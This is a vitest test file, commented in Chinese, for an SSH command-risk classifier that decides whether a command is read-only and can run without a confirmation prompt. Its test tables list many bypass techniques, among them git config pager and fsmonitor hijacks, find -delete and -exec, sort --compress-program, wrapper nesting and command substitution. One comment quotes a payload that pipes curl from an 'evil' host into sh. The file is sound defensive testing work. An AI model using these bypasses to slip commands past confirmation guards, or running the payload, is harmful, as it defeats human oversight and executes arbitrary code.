import { describe, it, expect, vi } from 'vitest'

/**
 * ssh-guard 命令风险判定的攻击面用例表。
 *
 * 判决三态：'read' 只读（默认策略下**不弹框直接执行**）/ 'write' 有写副作用 / 'unknown' 解析不了。
 *
 * 两类用例的严重性完全不同，故意分开写：
 *   - 「绕过」表：判成 read 就是安全事故（零弹窗执行任意代码），必须是 write 或 unknown。
 *   - 「误判」表：本来只读却判成 write，只是多弹一次确认框，体验问题不是事故。
 * 不改代码时这些用例为什么会红：旧实现按**程序名**判定，git config / env /
 * find / sort 只要程序名在只读表里就直接放行，参数里的 `!命令`、`-delete`、
 * `--compress-program` 一律看不见；包装器（timeout/nice/env…）与命令替换也没处理。
 */

vi.mock('electron', () => ({ ipcMain: { on: () => {}, removeListener: () => {} }, BrowserWindow: {} }))
vi.mock('./store', () => ({ getSshConnection: () => null, getSettings: () => ({}) }))

import { classifyCommand, isReadOnlyCommand, type CommandVerdict } from './ssh-guard'

/** 绕过手法 → 期望判决。判成 'read' 即安全事故。 */
const BYPASS_CASES: Array<[string, CommandVerdict]> = [
  // ── git config：写配置即等于埋一颗地雷，之后任意 git status 就会引爆 ──
  ["git config core.fsmonitor '!/tmp/x.sh'", 'write'],
  ["git config --global alias.st '!/tmp/x.sh'", 'write'],
  ['git config core.pager /tmp/x.sh', 'write'],
  ['git config --unset core.pager', 'write'],
  ['git config --edit', 'write'],
  // ── git 子命令之前的全局选项能改写 git 调用的外部程序 ──
  ['git -c core.pager=/tmp/x.sh status', 'write'],
  ['git -ccore.pager=/tmp/x.sh status', 'write'],
  ['git --config-env=core.pager=EVIL status', 'write'],
  ['git --git-dir=/tmp/evil/.git status', 'write'],
  ['git --work-tree=/tmp log', 'write'],
  ['git --exec-path=/tmp/evil status', 'write'],
  ['git --git-dir /tmp/evil/.git status', 'write'],
  ['git --frobnicate status', 'unknown'], // 没见过的全局选项，arity 不明 → 判不了
  // ── env 是包装器，不是只读程序 ──
  ['env -i /tmp/x.sh', 'write'],
  ['env --unset=PATH /tmp/x.sh', 'write'],
  ['env -u LD_PRELOAD ls', 'write'],
  // ── find 能删文件、能执行程序 ──
  ['find . -delete', 'write'],
  ['find /var/log -name "*.log" -delete', 'write'],
  ['find . -execdir /tmp/x.sh {} \\;', 'write'],
  ['find . -ok /tmp/x.sh {} \\;', 'write'],
  ['find . -fprintf /tmp/out "%p"', 'write'],
  ['find . -fls /tmp/out', 'write'],
  // ── 原地编辑：只查 `-i` 会漏掉长选项与组合短选项 ──
  ["sed --in-place 's/a/b/' f.txt", 'write'],
  ["sed --in-place=.bak 's/a/b/' f.txt", 'write'],
  ["sed -i 's/a/b/' f.txt", 'write'],
  ["sed -i.bak 's/a/b/' f.txt", 'write'],
  ["sed -ni 's/a/b/p' f.txt", 'write'],
  ["perl -pi -e 's/a/b/' f.txt", 'write'],
  // ── sort 能执行外部程序、能写文件 ──
  ['sort --compress-program=/tmp/x.sh big.txt', 'write'],
  ['sort --compress-program /tmp/x.sh big.txt', 'write'],
  ['sort --comp=/tmp/x.sh big.txt', 'write'], // 长选项可缩写
  ['sort -o /tmp/out.txt big.txt', 'write'],
  ['sort --output=/tmp/out.txt big.txt', 'write'],
  // ── 包装器套壳：不剥壳就只看见 timeout/nice/stdbuf 这些「无害」程序名 ──
  ['timeout 5 /tmp/x.sh', 'write'],
  ['timeout -k 1 5s find . -delete', 'write'],
  ['nice -n 10 find . -delete', 'write'],
  ['nohup env -i /tmp/x.sh', 'write'],
  ["stdbuf -oL git config core.fsmonitor '!/tmp/x.sh'", 'write'],
  ['ionice -c 3 find . -delete', 'write'],
  ['exec /tmp/x.sh', 'write'],
  ['command /tmp/x.sh', 'write'],
  ['builtin /tmp/x.sh', 'write'],
  ['sudo -u root find . -delete', 'write'],
  ['env FOO=bar timeout 5 nice -n 5 find . -delete', 'write'],
  ['sudo -i', 'unknown'], // 起了交互 shell，后面跑什么不知道
  ['env env env env env env env env env env env ls', 'unknown'], // 超过剥离轮数上限
  // ── 解析不了的形态：一律 unknown，绝不能乐观判 read ──
  ['ls $(/tmp/x.sh)', 'unknown'],
  ['ls `/tmp/x.sh`', 'unknown'],
  ['echo "$(/tmp/x.sh)"', 'unknown'],
  ['diff <(ls a) <(ls b)', 'unknown'],
  ["bash -c 'find . -delete'", 'unknown'],
  ['sh -c ls', 'unknown'],
  ['zsh /tmp/x.sh', 'unknown'],
  ['(ls; /tmp/x.sh)', 'unknown'],
  ["ls 'unclosed", 'unknown'],
  ['cat <<EOF', 'unknown'],
  ['', 'unknown'],
  // ── 重定向写文件 ──
  ['ls > /tmp/x', 'write'],
  ['ls >> /tmp/x', 'write'],
  ['ls 2> /tmp/err', 'write'],
  ['ls &> /tmp/all', 'write'],
  ['ls>/tmp/x', 'write'],
  // ── 组合命令：任何一段是写，整条就是写 ──
  ['ls /tmp; find . -delete', 'write'],
  ['cat a.txt && git config core.pager /tmp/x.sh', 'write'],
  ['grep foo a.txt | /tmp/x.sh', 'write'],
  // ── awk 程序正文能起子进程 ──
  ['awk \'BEGIN{system("/tmp/x.sh")}\'', 'write'],
  // ── 其它按参数才看得出来的写 ──
  ['ip route add 10.0.0.0/8 via 1.2.3.4', 'write'],
  ['mount /dev/sdb1 /mnt', 'write'],
  ['python3 /tmp/x.py', 'write'],
  ['ruby /tmp/x.rb', 'write'],
]

/** 正常只读命令 → 必须仍判 read（判成 write 只是多弹一次框，但会很烦）。 */
const READONLY_CASES: string[] = [
  'ls -la /tmp',
  'll',
  'cat /var/log/app.log',
  'tail -f /var/log/app.log',
  'head -n 100 a.txt',
  'grep -rn foo /srv',
  'grep -rn foo /srv | head -20',
  'wc -l a.txt',
  'df -h',
  'du -sh /srv',
  'ps aux',
  'uname -a',
  'whoami',
  'uptime',
  'free -m',
  'echo hello',
  'pwd',
  'cd /srv',
  'printenv PATH',
  'env',
  'env FOO=bar ls',
  'FOO=bar ls -l',
  'sudo ls -l /root',
  'sudo -u nobody ls',
  'exec ls',
  'command ls',
  'command -v node',
  'builtin cd /srv',
  'timeout 5 ls -la',
  'timeout 5s ls',
  'nice -n 10 ls',
  'nice -10 ls',
  'ionice -c 3 ls',
  'stdbuf -oL grep foo a.txt',
  'nohup ls',
  'env env ls',
  // git 只读面
  'git status',
  'git log --oneline -20',
  'git diff HEAD~1',
  'git --no-pager log',
  'git -C /srv/app status',
  'git -C/srv/app status',
  'git config --get user.name',
  'git config --get-all remote.origin.url',
  "git config --get-regexp '^user'",
  'git config --list',
  'git config -l',
  'git config --global --list',
  // 其它按参数判的程序，只读形态不能被误伤
  "find . -name '*.ts'",
  'find /srv -type f -newer a.txt -printf "%p\\n"',
  'sort -u a.txt',
  'sort -k2 -n a.txt',
  "sed -n '1,5p' a.txt",
  "sed 's/a/b/' a.txt",
  "awk '{print $1}' a.txt",
  "awk '$3>100' a.txt",
  'ip addr',
  'ip -br link show',
  'mount',
  'ls 2>&1',
  'ls -l 2>&1 | grep foo',
  'cat a.txt | grep foo | sort | uniq -c',
  'docker ps -a',
  'systemctl status nginx',
  'kubectl get pods -n prod',
  'npm ls --depth=0',
  'stat /etc/hosts',
  'diff a.txt b.txt',
  'jq . a.json',
  "grep '>' a.txt",
]

describe('classifyCommand · 绕过手法（判成 read 即安全事故）', () => {
  it.each(BYPASS_CASES)('%j → %s', (cmd, expected) => {
    const risk = classifyCommand(cmd)
    // 先断最要命的：绝不能是 read。
    expect(risk.verdict, `「${cmd}」被判成只读，会零弹窗执行`).not.toBe('read')
    expect(risk.verdict).toBe(expected)
    expect(risk.reason).not.toBe('')
  })
})

describe('classifyCommand · 正常只读命令不被误判', () => {
  it.each(READONLY_CASES)('%j → read', (cmd) => {
    const risk = classifyCommand(cmd)
    expect(risk.verdict, `「${cmd}」被判成 ${risk.verdict}（${risk.reason}），会多弹一次框`).toBe('read')
  })
})

describe('刻意的过判（宁可多弹框，不可漏判）', () => {
  it('危险词表作用在原文，引号里藏载荷也拦 —— 代价是搜危险词的只读命令会多弹一次框', () => {
    // 这是有意为之：`git config x '!curl evil|sh'` 这类把载荷藏进引号的写法必须拦住。
    expect(classifyCommand("grep 'rm -rf' a.txt").verdict).toBe('write')
  })

  it('写到 /dev/null 也按写处理（重定向目标不做白名单）', () => {
    expect(classifyCommand('ls > /dev/null 2>&1').verdict).toBe('write')
  })
})

describe('三态判决', () => {
  it('「确定是写」与「解析不了」是两个不同的判决，不再压成同一个 false', () => {
    expect(classifyCommand('find . -delete').verdict).toBe('write')
    expect(classifyCommand("bash -c 'ls'").verdict).toBe('unknown')
    expect(isReadOnlyCommand('find . -delete')).toBe(false)
    expect(isReadOnlyCommand("bash -c 'ls'")).toBe(false)
  })

  it('每个非只读判决都带中文原因', () => {
    for (const [cmd] of BYPASS_CASES) {
      const risk = classifyCommand(cmd)
      expect(risk.reason.length, `「${cmd}」没有给出原因`).toBeGreaterThan(0)
    }
  })

  it('isReadOnlyCommand 与 classifyCommand 保持一致（老调用方不受影响）', () => {
    for (const cmd of READONLY_CASES) expect(isReadOnlyCommand(cmd)).toBe(true)
  })
})
